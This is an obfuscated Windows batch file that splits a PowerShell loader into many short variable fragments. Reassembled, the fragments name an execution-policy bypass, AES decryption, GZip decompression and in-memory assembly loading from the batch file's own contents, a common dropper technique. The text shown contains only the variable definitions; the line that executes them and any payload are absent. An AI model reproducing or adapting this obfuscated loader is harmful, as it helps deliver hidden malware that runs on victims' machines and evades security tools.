@echo off
set "IFMnsFzNBA=aS);"
set "FkJEdKXvNt=am;$"
set "nEHwPmkoQM=Disp"
set "VSrykHPVqC=ring"
set "jvXkNuFhCG=pStr"
set "LSZUOwGYhw=gnir"
set "eeXeYfxMfh=comp"
set "MvqNasUyaf=);$y"
set "dqGHtMrgvq=th('"
set "KJhmLbjvcM=;$wg"
set "ahjAleAqKP=::De"
set "ogSuKZFOan=]::C"
set "dTVahPPafp=$yGF"
set "nTjSyFkBnJ=);$U"
set "bUPxoWmhKY=Obje"
set "pjjJvCtQWn=;$Up"
set "eCkvxnHqkm=oint"
set "izRmTBBBNU=ecry"
set "sDHXZBHHmq=GFsN"
set "UKAMfpszNk=trea"
set "RWzQHjiqbX=ress"
set "XHEauwvSxC=] -j"
set "rHPtSMENqt=Uaaa"
set "LMMIYlnbum= [st"
set "GVxBhpIqAP=;$ZU"
set "WbzGOnUXFB=.Cre"
set "ByNrhGvOxf=stem"
set "FxlNXndSaS=7;$y"
set "tdBtewrfOo=)($U"
set "jlkYDzVIvW=aaaS"
set "CvNjrYifkp=in $"
set "JFwrNhDeVD=]::("
set "erVkMbaotn=bstr"
set "XUaughTSYM=ss -"
set "wKpyexjdAS=ct S"
set "SlhqAtgwau=se()"
set "vMwZPTDjCo=ert]"
set "UgHxHcgwAv=bF.T"
set "nIfuXHQWLG=[Sys"
set "paPPyArTEc=.Con"
set "jlSqLJndtV=raph"
set "fSFLxdrMVC=L.Su"
set "QNzmXwrSWP=saBm"
set "HVXAvHRSSJ=zHhH"
set "UkyBmaItlt=-4] "
set "BDOwLBgjZz=sion"
set "czgdLDwpTM=Syst"
set "RYFkLLhYMS=NgL "
set "hivdyCwFXU=);$f"
set "kNyPkafMeC=yste"
set "pqkTYJcRdF=ct S"
set "NBjBZNzNDO=ateD"
set "sVdEmTipUK=ke($"
set "JVuVyCXojK=PxEW"
set "MIvAdYAdUv=UL.D"
set "XMaNjdZZXO=.Dis"
set "wnFkDpYBQA=$fir"
set "iDSsdAdZPU=embl"
set "LjsThToyzP='')("
set "DruqNjaRqg=fore"
set "ewLeQikHex=O.Me"
set "sLoLCvSAYS=();$"
set "DkzvjHuKCE=Comp"
set "coXOpFjSgV=EY.T"
set "mRLdxABeaK=Disp"
set "gIoMYcqXIL=.Cry"
set "KSTBQNmRtH=.Len"
set "OUuaPUwgzQ=sN.I"
set "MrLammehSQ=m.Re"
set "LtkLXnhCIM=S = "
set "mdWRMwWflr=[Env"
set "CCbmHjDJHM=$UpN"
set "ljmMtTMtfK=:: '"
set "CcZveURmUJ=BC;$"
set "lKwXcCxxdI=k; }"
set "GlmwcobCsQ=n ''"
set "ZuTklyDwrY='gni"
set "zbRAElyplN=New-"
set "NpoNKdwjmW=rofi"
set "kawBcUwAsB=aS ="
set "lLPtqUnxHo=$Uaa"
set "uPYvhNaRtB=)) {"
set "xKmJyhrZiF=$Uaa"
set "pVmdJyUdXu=N.Pa"
set "YXpxLknXry=File"
set "LqOlwkFfrp===')"
set "HucCVdHcGs=abF."
set "ZYEDxYJlBq=-ep "
set "oeJWqrByQG=F'[-"
set "nqxlAEJIWj=euVe"
set "tyvRFUxeWP=abF "
set "BkgiJXMYbN='0Pg"
set "RFHkcGhdAI=eam("
set "xwILRrlHyB=grap"
set "nEbfQLlXQh='[-1"
set "cBsmxPfTRi=-nop"
set "hMOgrWfltc=Invo"
set "rXlJsBewEn=ptog"
set "PmDNjgsgWH=e]::"
set "NiUyhJdzpZ=('da"
set "dcpovGfNdu=bypa"
set "YphMeUPXbo=gMod"
set "DMvnCgEGUE=m(, "
set "WuwrbMneBm= [Sy"
set "ARicxnIBds=pres"
set "noAlpRIAhW=($HV"
set "inXPqrBRnx=esaB"
set "onwgIxWweb=:('g"
set "gbqpwPFgtJ=ptog"
set "hfmQXiJIUL=)($f"
set "yjDXAvHuTq=();$"
set "kPGriEmSYF=join"
set "aNpAYnWFsT=tem."
set "IQcalbCsHQ=.-16"
set "BzFSBHNbTZ=RCUL"
set "ObEEmoAAQe=nirt"
set "aAWTPOWDpt=null"
set "YUhzyJDxbq=6esa"
set "GRASENkOkx==');"
set "nAFrTZuVTS=stem"
set "fbDoQXLXIG=yGFs"
set "hIADCcXxIE=Syst"
set "rdotdadRJZ=Conv"
set "ydkEFSNqGp='[-1"
set "qhjssDPSse=S = "
set "kEIewyRykv=hy.A"
set "fvhZemohXw=, (,"
set "OvhZnEipFX=TllA"
set "VAQvXhWiiX=GFsN"
set "uJSTpZVUMy=$ZUa"
set "UTVXuBsITz=Secu"
set "QAnaGCYSXB=.IO."
set "IBdNkbYNNu=[Sys"
set "EdjMbLkCtv=join"
set "SLOqHYSELU=ment"
set "NFErzpKMyK=t Sy"
set "tAVreXeQSF=ddin"
set "huBhgFxSCM=Star"
set "kaLUeMVnXX=GFsN"
set "OvZVdorkzF= = $"
set "VWpqAXsXZV=GFsN"
set "LOpIzwtKAu=($HV"
set "qZAGQOMtvg=.Mem"
set "osMGlnfxyF=y]::"
set "FTyudWQoyZ=3); "
set "NtczNbQqIG=ionM"
set "gFXbrtDvRd= = $"
set "BrozvKoaeM=.GZi"
set "FEJBpIYcyX=);$w"
set "EqZvkuKiAd=[-1."
set "WAExgAvbeC=, $U"
set "vvxLRzOXOd=gjYA"
set "UfuacEtdVh=16] "
set "fnIQEZOpeH=aaaS"
set "kDqxhJBYvG= = N"
set "lViuLZvDEW=UpNC"
set "pURrqiZEgX=dj0C"
set "UOKKHMFIqd=6] -"
set "PLdfnDNBls=morF"
set "kZWNBdTbdU=gsYZ"
set "FXTlCLDpTv=.Key"
set "ZdopsQYgLr=;$wm"
set "buOsHgloKt=oryS"
set "wiiMUketjt=y.Cr"
set "cPBqReiJbv=$fir"
set "QUIkNHdVHs=]::("
set "hNBrDWAuMw=.Mod"
set "lyaeDYsqmG=Obje"
set "rzmnCHyWmt=tion"
set "xzeKMWjxgg=esMa"
set "KnZQEWMONH=oArr"
set "VqAlgcLLao=rity"
set "DzgrfqqaYW=-1.."
set "YfbuatcrLR=mMEo"
set "sWvInFJOhC=rity"
set "MPcnDUyuSB=PTtG"
set "XtiLegVGwi=ew-O"
set "tMEJPKxEdv=Secu"
set "LRfYVWEZtY=ddin"
set "dWgfkYHXrH=();$"
set "EOJgVfEPYp=]::N"
set "GNmnuVvJso=yste"
set "KJKdsvRFJx=bjec"
set "ifHubklQwX=n ''"
set "yINEGYrRJv=tS46"
set "FKpsleYkwp=$EGq"
set "zTvgiyxglV=irEY"
set "tmPdfCcyyG=S, 0"
set "OpPBsFUmbU=NCJ."
set "oLchEemtMC=1..-"
set "IDYNyyUqxd=('Tg"
set "ouHtvxUkDx=..-1"
set "LzNTTlZPkB=HVNg"
set "kVzljILaLi=.Com"
set "acUzkPvzCe=ck($"
set "iigdAJNAEh=('%~f0'"
set "tkHWTTFueH=and "
set "WmIDaAZrqn=ispo"
set "iWsIaTWYeB=106u"
set "sUBlkJpNnm=J = "
